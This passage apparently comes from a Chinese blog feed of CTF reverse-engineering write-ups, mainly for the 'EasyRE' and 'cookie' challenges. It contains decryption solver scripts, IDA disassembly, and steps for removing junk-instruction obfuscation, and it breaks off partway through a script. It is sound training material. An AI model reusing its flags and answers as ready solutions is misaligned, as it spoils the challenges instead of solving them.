<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   char a[] = &#123;0x7B,0x65,</span><br><span class="line">0x73,</span><br><span class="line">0x72,</span><br><span class="line">0x65,</span><br><span class="line">0x76,</span><br><span class="line">0x65,</span><br><span class="line">0x72,</span><br><span class="line">0x5F,</span><br><span class="line">0x72,</span><br><span class="line">0x65,</span><br><span class="line">0x76,</span><br><span class="line">0x65,</span><br><span class="line">0x72,</span><br><span class="line">0x73,</span><br><span class="line">0x65,</span><br><span class="line">0x64,</span><br><span class="line">0x5F,</span><br><span class="line">0x79,</span><br><span class="line">0x6F,</span><br><span class="line">0x75,</span><br><span class="line">0x74,</span><br><span class="line">0x75,</span><br><span class="line">0x62,</span><br><span class="line">0x65,</span><br><span class="line">0x2E,</span><br><span class="line">0x63,</span><br><span class="line">0x6F,</span><br><span class="line">0x6D,</span><br><span class="line">0x2F,</span><br><span class="line">0x77,</span><br><span class="line">0x61,</span><br><span class="line">0x74,</span><br><span class="line">0x63,</span><br><span class="line">0x68,</span><br><span class="line">0x3F,</span><br><span class="line">0x76,</span><br><span class="line">0x3D,</span><br><span class="line">0x49,</span><br><span class="line">0x38,</span><br><span class="line">0x69,</span><br><span class="line">0x6A,</span><br><span class="line">0x62,</span><br><span class="line">0x34,</span><br><span class="line">0x5A,</span><br><span class="line">0x65,</span><br><span class="line">0x65,</span><br><span class="line">0x35,</span><br><span class="line">0x45,</span><br><span class="line">0x7D&#125;;</span><br><span class="line">        printf(&quot;%s&quot;,a);</span><br><span class="line">   return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;esrever_reversed_youtube.com/watch?v=I8ijb4Zee5E&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>reverse</category>
        <category>刷题记录</category>
      </categories>
  </entry>
  <entry>
    <title>上海磐石re和pwn部分wp</title>
    <url>/2025/08/07/%E4%B8%8A%E6%B5%B7%E7%A3%90%E7%9F%B3re%E5%92%8Cpwn%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h2 id="EasyRE"><a href="#EasyRE" class="headerlink" title="EasyRE"></a>EasyRE</h2><p>ai一把出直接给exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rol</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">8</span> - n))) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; n) | (x &lt;&lt; (<span class="number">8</span> - n))) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unxor_chain</span>(<span class="params">data</span>):</span><br><span class="line">    temp = [<span class="number">0</span>] * <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            temp[i] = data[i] ^ <span class="number">0x42</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp[i] = (data[i] ^ data[i-<span class="number">1</span>]) ^ <span class="number">0x42</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_sbox</span>():</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] - <span class="number">7</span>*(i//<span class="number">7</span>) + i + <span class="number">4919</span>) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">target</span>):</span><br><span class="line">    temp_v24 = unxor_chain(target)</span><br><span class="line">    s = generate_sbox()  <span class="comment"># 固定 s-box</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    flag = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(temp_v24)):</span><br><span class="line">        <span class="comment"># Step 1: i = (i + 1) % 256</span></span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 2: j 更新</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            j = (j + s[<span class="number">3</span> * i % <span class="number">256</span>]) % <span class="number">256</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = (j + s[i]) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 3: 交换 s[i] 和 s[j]</span></span><br><span class="line">        old_si = s[i]</span><br><span class="line">        old_sj = s[j]</span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 4: 计算 index = (old_s[i] + new_s[i]) &amp; 0xFF = (old_si + s[i]) &amp; 0xFF</span></span><br><span class="line">        index = (old_si + s[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        ks = s[index]  <span class="comment"># keystream byte</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 5: bias = (i * j) % 16</span></span><br><span class="line">        bias = (i * j) % <span class="number">16</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 6: temp_v24[idx] = rol( bias + (flag_char ^ ks), 3 )</span></span><br><span class="line">        decrypted_val = ror(temp_v24[idx], <span class="number">3</span>)  <span class="comment"># ror by 3</span></span><br><span class="line">        <span class="comment"># =&gt; bias + (flag_char ^ ks) = decrypted_val</span></span><br><span class="line">        xor_val = decrypted_val - bias</span><br><span class="line">        xor_val &amp;= <span class="number">0xFF</span>  <span class="comment"># 模 256</span></span><br><span class="line"></span><br><span class="line">        flag_char = xor_val ^ ks</span><br><span class="line">        flag.append(flag_char)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(flag).decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标数据</span></span><br><span class="line">target = [</span><br><span class="line">    <span class="number">0x93</span>, <span class="number">0xF9</span>, <span class="number">0x8D</span>, <span class="number">0x92</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0xD9</span>, <span class="number">0x05</span>, <span class="number">0xC6</span>, <span class="number">0x0A</span>, <span class="number">0x50</span>,</span><br><span class="line">    <span class="number">0xC7</span>, <span class="number">0xDB</span>, <span class="number">0x4F</span>, <span class="number">0xCB</span>, <span class="number">0xD8</span>, <span class="number">0x5D</span>, <span class="number">0xA6</span>, <span class="number">0xB9</span>, <span class="number">0x40</span>, <span class="number">0x95</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0xE7</span>, <span class="number">0x9A</span>, <span class="number">0x37</span>, <span class="number">0x72</span>, <span class="number">0x4D</span>, <span class="number">0xEF</span>, <span class="number">0x57</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag = decrypt_flag(target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure>





<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">start</span><span class="params">(__int64 a1, __int64 a2, <span class="type">void</span> (*a3)(<span class="type">void</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = v5;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  _libc_start_main(main, v4, &amp;retaddr, init, fini, a3, &amp;v5);</span><br><span class="line">  __halt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>点击main，发现有花指令，改一下</p>
<p>先给出修改好的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  __int64 buf[<span class="number">6</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">5</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">1452940357</span>;</span><br><span class="line">  v7[<span class="number">1</span>] = <span class="number">-282301936</span>;</span><br><span class="line">  v7[<span class="number">2</span>] = <span class="number">-79426602</span>;</span><br><span class="line">  v7[<span class="number">3</span>] = <span class="number">1469576221</span>;</span><br><span class="line">  v7[<span class="number">4</span>] = <span class="number">1379922627</span>;</span><br><span class="line">  v7[<span class="number">5</span>] = <span class="number">1211333849</span>;</span><br><span class="line">  v7[<span class="number">6</span>] = <span class="number">907455533</span>;</span><br><span class="line">  v7[<span class="number">7</span>] = <span class="number">112603437</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pls input flag&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x20u</span>LL);</span><br><span class="line">  sub_55A7A6AAA1A9((<span class="type">unsigned</span> <span class="type">int</span> *)buf, v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7[i] != *(_DWORD *)(<span class="number">4LL</span> * i + v3) || v7[<span class="number">2</span> * i + <span class="number">1</span>] != *(_DWORD *)(<span class="number">4</span> * (<span class="number">2</span> * i + <span class="number">1LL</span>) + v3) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">      _exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_55A7A6AAA1A9</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = a1[<span class="number">2</span> * i];</span><br><span class="line">    v4 = a1[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x1F</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 -= <span class="number">1988930350</span>;</span><br><span class="line">      v3 += v5 ^ (v4 + v5) ^ (<span class="number">16</span> * v4 + *a2) ^ ((v4 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">1</span>]);</span><br><span class="line">      v4 += v5 ^ (v3 + v5) ^ (<span class="number">16</span> * v3 + a2[<span class="number">2</span>]) ^ ((v3 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    a1[<span class="number">2</span> * i] = v3;</span><br><span class="line">    a1[<span class="number">2</span> * i + <span class="number">1</span>] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是改好的</p>
<p>现在来说怎么改,点击进来时你可以发现都是没定义的，直接改patch根本不行，我就先用kali远程调试了一下，让数据重新加载了一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001308 main:                                   ; DATA XREF: start+21↑o</span><br><span class="line">.text:0000000000001308 ; __unwind &#123;</span><br><span class="line">.text:0000000000001308                 endbr64</span><br><span class="line">.text:000000000000130C                 push    rbp</span><br><span class="line">.text:000000000000130D                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001310                 sub     rsp, 70h</span><br><span class="line">.text:0000000000001314                 mov     rax, fs:28h</span><br><span class="line">.text:000000000000131D                 mov     [rbp-8], rax</span><br><span class="line">.text:0000000000001321                 xor     eax, eax</span><br><span class="line">.text:0000000000001323                 mov     dword ptr [rbp-60h], 2</span><br><span class="line">.text:000000000000132A</span><br><span class="line">.text:000000000000132A loc_132A:                               ; CODE XREF: .text:loc_1363↓j</span><br><span class="line">.text:000000000000132A                 mov     dword ptr [rbp-5Ch], 0</span><br><span class="line">.text:0000000000001331                 mov     dword ptr [rbp-58h], 2</span><br><span class="line">.text:0000000000001338                 mov     dword ptr [rbp-54h], 2</span><br><span class="line">.text:000000000000133F                 mov     qword ptr [rbp-30h], 0</span><br><span class="line">.text:0000000000001347                 mov     qword ptr [rbp-28h], 0</span><br><span class="line">.text:000000000000134F                 mov     qword ptr [rbp-20h], 0</span><br><span class="line">.text:0000000000001357                 mov     qword ptr [rbp-18h], 0</span><br><span class="line">.text:000000000000135F                 jz      short near ptr loc_1363+1</span><br><span class="line">.text:0000000000001361                 jnz     short near ptr loc_1363+1</span><br><span class="line">.text:0000000000001363</span><br><span class="line">.text:0000000000001363 loc_1363:                               ; CODE XREF: .text:000000000000135F↑j</span><br><span class="line">.text:0000000000001363                                         ; .text:0000000000001361↑j</span><br><span class="line">.text:0000000000001363                 loope   near ptr loc_132A+2</span><br><span class="line">.text:0000000000001365                 mov     r8b, 45h ; &#x27;E&#x27;</span><br><span class="line">.text:0000000000001368                 sbb     al, 9Ah</span><br><span class="line">.text:000000000000136A                 push    rsi</span><br><span class="line">.text:000000000000136B                 mov     dword ptr [rbp-4Ch], 0EF2C6A10h</span><br><span class="line">.text:0000000000001372                 mov     dword ptr [rbp-48h], 0FB440BD6h</span><br><span class="line">.text:0000000000001379                 mov     dword ptr [rbp-44h], 5797F41Dh</span><br><span class="line">.text:0000000000001380                 mov     dword ptr [rbp-40h], 523FF2C3h</span><br><span class="line">.text:0000000000001387                 mov     dword ptr [rbp-3Ch], 48337CD9h</span><br><span class="line">.text:000000000000138E                 mov     dword ptr [rbp-38h], 3616AC2Dh</span><br><span class="line">.text:0000000000001395                 mov     dword ptr [rbp-34h], 6B6312Dh</span><br><span class="line">.text:000000000000139C                 lea     rdi, aPlsInputFlag ; &quot;Pls input flag&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000011A9 loc_11A9:                               ; CODE XREF: .text:00000000000013D1↓p</span><br><span class="line">.text:00000000000011A9 ; __unwind &#123;</span><br><span class="line">.text:00000000000011A9                 endbr64</span><br><span class="line">.text:00000000000011AD                 push    rbp</span><br><span class="line">.text:00000000000011AE                 mov     rbp, rsp</span><br><span class="line">.text:00000000000011B1                 mov     [rbp-38h], rdi</span><br><span class="line">.text:00000000000011B5                 mov     [rbp-40h], rsi</span><br><span class="line">.text:00000000000011B9                 jz      short near ptr loc_11BD+1</span><br><span class="line">.text:00000000000011BB                 jnz     short near ptr loc_11BD+1</span><br><span class="line">.text:00000000000011BD</span><br><span class="line">.text:00000000000011BD loc_11BD:                               ; CODE XREF: .text:00000000000011B9↑j</span><br><span class="line">.text:00000000000011BD                                         ; .text:00000000000011BB↑j</span><br><span class="line">.text:00000000000011BD                 loope   near ptr loc_1182+4</span><br><span class="line">.text:00000000000011BF                 db      45h</span><br><span class="line">.text:00000000000011BF                 fadd    dword ptr [r8]</span><br><span class="line">.text:00000000000011BF ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000011C2                 dw 0</span><br><span class="line">.text:00000000000011C4                 dd 12EE900h</span><br><span class="line">.text:00000000000011C8                 dq 48C001D8458B0000h, 85148D4898h, 0D00148C8458B4800h</span><br><span class="line">.text:00000000000011E0                 dq 0D8458BDC4589008Bh, 1C083489848C001h, 85148D48h, 8BD00148C8458B48h</span><br><span class="line">.text:0000000000001200                 dq 0E445C7E0458900h, 54D2EC45C7000000h, 8BC0458B488973h</span><br><span class="line">.text:0000000000001218                 dq 8BC0458B48F04589h, 458B48F445890440h, 48F8458908408BC0h</span><br><span class="line">.text:0000000000001230                 dq 45890C408BC0458Bh, 0E845C7FCh, 8BE1017503746DEBh, 0E0458BE44501EC45h</span><br><span class="line">.text:0000000000001250                 dq 0F0458BC28904E0C1h, 458BE0558B020C8Dh, 8BCA89C131D001E4h</span><br><span class="line">.text:0000000000001268                 dq 8BC18905E8C1E045h, 4533D031C801F445h, 0C1DC458BDC4501E4h</span><br><span class="line">.text:0000000000001280                 dq 8DF8458BC28904E0h, 0E4458BDC558B020Ch, 458BCA89C131D001h</span><br><span class="line">.text:0000000000001298                 dq 458BC18905E8C1DCh, 0E44533D031C801FCh, 8301E84583E04501h</span><br><span class="line">.text:00000000000012B0                 dq 7503748D761FE87Dh, 48C001D8458BE101h, 85148D4898h, 0C20148C8458B4800h</span><br><span class="line">.text:00000000000012D0                 dq 0D8458B0289DC458Bh, 1C083489848C001h, 85148D48h, 8BC20148C8458B48h</span><br><span class="line">.text:00000000000012F0                 dq 1D845830289E045h, 0FEC88E0F03D87D83h, 0C35DC8458B48FFFFh</span><br></pre></td></tr></table></figure>



<p>重新加载后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000563C791E1308 main:                                   ; DATA XREF: start+21↑o</span><br><span class="line">.text:0000563C791E1308 ; __unwind &#123; // 563C791E0000</span><br><span class="line">.text:0000563C791E1308                 endbr64</span><br><span class="line">.text:0000563C791E130C                 push    rbp</span><br><span class="line">.text:0000563C791E130D                 mov     rbp, rsp</span><br><span class="line">.text:0000563C791E1310                 sub     rsp, 70h</span><br><span class="line">.text:0000563C791E1314                 mov     rax, fs:28h</span><br><span class="line">.text:0000563C791E131D                 mov     [rbp-8], rax</span><br><span class="line">.text:0000563C791E1321                 xor     eax, eax</span><br><span class="line">.text:0000563C791E1323                 mov     dword ptr [rbp-60h], 2</span><br><span class="line">.text:0000563C791E132A                 mov     dword ptr [rbp-5Ch], 0</span><br><span class="line">.text:0000563C791E1331                 mov     dword ptr [rbp-58h], 2</span><br><span class="line">.text:0000563C791E1338                 mov     dword ptr [rbp-54h], 2</span><br><span class="line">.text:0000563C791E133F                 mov     qword ptr [rbp-30h], 0</span><br><span class="line">.text:0000563C791E1347                 mov     qword ptr [rbp-28h], 0</span><br><span class="line">.text:0000563C791E134F                 mov     qword ptr [rbp-20h], 0</span><br><span class="line">.text:0000563C791E1357                 mov     qword ptr [rbp-18h], 0</span><br><span class="line">.text:0000563C791E135F                 jz      short loc_563C791E1364</span><br><span class="line">.text:0000563C791E1361                 jnz     short loc_563C791E1364</span><br><span class="line">.text:0000563C791E1361 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000563C791E1363                 db 0E1h</span><br><span class="line">.text:0000563C791E1364 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000563C791E1364</span><br><span class="line">.text:0000563C791E1364 loc_563C791E1364:                       ; CODE XREF: .text:0000563C791E135F↑j</span><br><span class="line">.text:0000563C791E1364                                         ; .text:0000563C791E1361↑j</span><br><span class="line">.text:0000563C791E1364                 mov     dword ptr [rbp-50h], 569A1C45h</span><br><span class="line">.text:0000563C791E136B                 mov     dword ptr [rbp-4Ch], 0EF2C6A10h</span><br><span class="line">.text:0000563C791E1372                 mov     dword ptr [rbp-48h], 0FB440BD6h</span><br><span class="line">.text:0000563C791E1379                 mov     dword ptr [rbp-44h], 5797F41Dh</span><br><span class="line">.text:0000563C791E1380                 mov     dword ptr [rbp-40h], 523FF2C3h</span><br><span class="line">.text:0000563C791E1387                 mov     dword ptr [rbp-3Ch], 48337CD9h</span><br><span class="line">.text:0000563C791E138E                 mov     dword ptr [rbp-38h], 3616AC2Dh</span><br><span class="line">.text:0000563C791E1395                 mov     dword ptr [rbp-34h], 6B6312Dh</span><br><span class="line">.text:0000563C791E139C                 lea     rdi, aPlsInputFlag ; &quot;Pls input flag&quot;</span><br><span class="line">.text:0000563C791E13A3                 call    _puts</span><br><span class="line">.text:0000563C791E13A8                 lea     rax, [rbp-30h]</span><br><span class="line">.text:0000563C791E13AC                 mov     edx, 20h ; &#x27; &#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000055E1FCA101A9                 endbr64</span><br><span class="line">.text:000055E1FCA101AD                 push    rbp</span><br><span class="line">.text:000055E1FCA101AE                 mov     rbp, rsp</span><br><span class="line">.text:000055E1FCA101B1                 mov     [rbp-38h], rdi</span><br><span class="line">.text:000055E1FCA101B5                 mov     [rbp-40h], rsi</span><br><span class="line">.text:000055E1FCA101B9                 jz      short loc_55E1FCA101BE</span><br><span class="line">.text:000055E1FCA101BB                 jnz     short loc_55E1FCA101BE</span><br><span class="line">.text:000055E1FCA101BB ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055E1FCA101BD                 db 0E1h    //nop</span><br><span class="line">.text:000055E1FCA101BE ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055E1FCA101BE</span><br><span class="line">.text:000055E1FCA101BE loc_55E1FCA101BE:                       ; CODE XREF: .text:000055E1FCA101B9↑j</span><br><span class="line">.text:000055E1FCA101BE                                         ; .text:000055E1FCA101BB↑j</span><br><span class="line">.text:000055E1FCA101BE                 mov     dword ptr [rbp-28h], 0</span><br><span class="line">.text:000055E1FCA101C5                 jmp     loc_55E1FCA102F8</span><br><span class="line">.text:000055E1FCA101CA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055E1FCA101CA</span><br><span class="line">.text:000055E1FCA101CA loc_55E1FCA101CA:                       ; CODE XREF: .text:000055E1FCA102FC↓j</span><br><span class="line">.text:000055E1FCA101CA                 mov     eax, [rbp-28h]</span><br><span class="line">.text:000055E1FCA101CD                 add     eax, eax</span><br><span class="line">.text:000055E1FCA101CF                 cdqe</span><br><span class="line">.text:000055E1FCA101D1                 lea     rdx, ds:0[rax*4]</span><br><span class="line">.text:000055E1FCA101D9                 mov     rax, [rbp-38h]</span><br><span class="line">.text:000055E1FCA101DD                 add     rax, rdx</span><br><span class="line">.text:000055E1FCA101E0                 mov     eax, [rax]</span><br><span class="line">.text:000055E1FCA101E2                 mov     [rbp-24h], eax</span><br><span class="line">.text:000055E1FCA101E5                 mov     eax, [rbp-28h]</span><br><span class="line">.text:000055E1FCA101E8                 add     eax, eax</span><br><span class="line">.text:000055E1FCA101EA                 cdqe</span><br><span class="line">.text:000055E1FCA101EC                 add     rax, 1</span><br><span class="line">.text:000055E1FCA101F0                 lea     rdx, ds:0[rax*4]</span><br><span class="line">.text:000055E1FCA101F8                 mov     rax, [rbp-38h]</span><br><span class="line">.text:000055E1FCA101FC                 add     rax, rdx</span><br><span class="line">.text:000055E1FCA101FF                 mov     eax, [rax]</span><br><span class="line">.text:000055E1FCA10201                 mov     [rbp-20h], eax</span><br><span class="line">.text:000055E1FCA10204                 mov     dword ptr [rbp-1Ch], 0</span><br><span class="line">.text:000055E1FCA1020B                 mov     dword ptr [rbp-14h], 897354D2h</span><br><span class="line">.text:000055E1FCA10212                 mov     rax, [rbp-40h]</span><br><span class="line">.text:000055E1FCA10216                 mov     eax, [rax]</span><br><span class="line">.text:000055E1FCA10218                 mov     [rbp-10h], eax</span><br><span class="line">.text:000055E1FCA1021B                 mov     rax, [rbp-40h]</span><br><span class="line">.text:000055E1FCA1021F                 mov     eax, [rax+4]</span><br><span class="line">.text:000055E1FCA10222                 mov     [rbp-0Ch], eax</span><br><span class="line">.text:000055E1FCA10225                 mov     rax, [rbp-40h]</span><br><span class="line">.text:000055E1FCA10229                 mov     eax, [rax+8]</span><br><span class="line">.text:000055E1FCA1022C                 mov     [rbp-8], eax</span><br><span class="line">.text:000055E1FCA1022F                 mov     rax, [rbp-40h]</span><br><span class="line">.text:000055E1FCA10233                 mov     eax, [rax+0Ch]</span><br><span class="line">.text:000055E1FCA10236                 mov     [rbp-4], eax</span><br><span class="line">.text:000055E1FCA10239                 mov     dword ptr [rbp-18h], 0</span><br><span class="line">.text:000055E1FCA10240                 jmp     short loc_55E1FCA102AF</span><br></pre></td></tr></table></figure>

<p>把类似这样的nop(在汇编标出) ，P重定义，tab就得到伪代码了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000055E1FCA101BB ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055E1FCA101BD                 db 0E1h    //nop</span><br><span class="line">.text:000055E1FCA101BE ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>ok,现在可以给exp了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_encrypt</span>():</span><br><span class="line">    <span class="comment"># 目标值（处理后的结果），来自v7数组，转换为32位无符号整数</span></span><br><span class="line">    v7 = [</span><br><span class="line">        <span class="number">1452940357</span>,</span><br><span class="line">        -<span class="number">282301936</span>,</span><br><span class="line">        -<span class="number">79426602</span>,</span><br><span class="line">        <span class="number">1469576221</span>,</span><br><span class="line">        <span class="number">1379922627</span>,</span><br><span class="line">        <span class="number">1211333849</span>,</span><br><span class="line">        <span class="number">907455533</span>,</span><br><span class="line">        <span class="number">112603437</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将v7转换为32位无符号整数，并按对分组</span></span><br><span class="line">    targets = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>):</span><br><span class="line">        v3_final = v7[i] &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v4_final = v7[i + <span class="number">1</span>] &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        targets.append((v3_final, v4_final))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># a2数组的值，固定为[2, 0, 2, 2]</span></span><br><span class="line">    a2 = [<span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>]</span><br><span class="line">    initial_pairs = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对每对目标值进行逆向计算</span></span><br><span class="line">    <span class="keyword">for</span> (target_v3, target_v4) <span class="keyword">in</span> targets:</span><br><span class="line">        current_v3 = target_v3</span><br><span class="line">        current_v4 = target_v4</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 逆向32步加密过程（从第31步到第0步）</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">32</span>)):  <span class="comment"># j = 31, 30, ..., 0</span></span><br><span class="line">            <span class="comment"># 计算当前步骤的v5值</span></span><br><span class="line">            v5 = (-<span class="number">1988930350</span>) * (j + <span class="number">1</span>)</span><br><span class="line">            v5 &amp;= <span class="number">0xFFFFFFFF</span>  <span class="comment"># 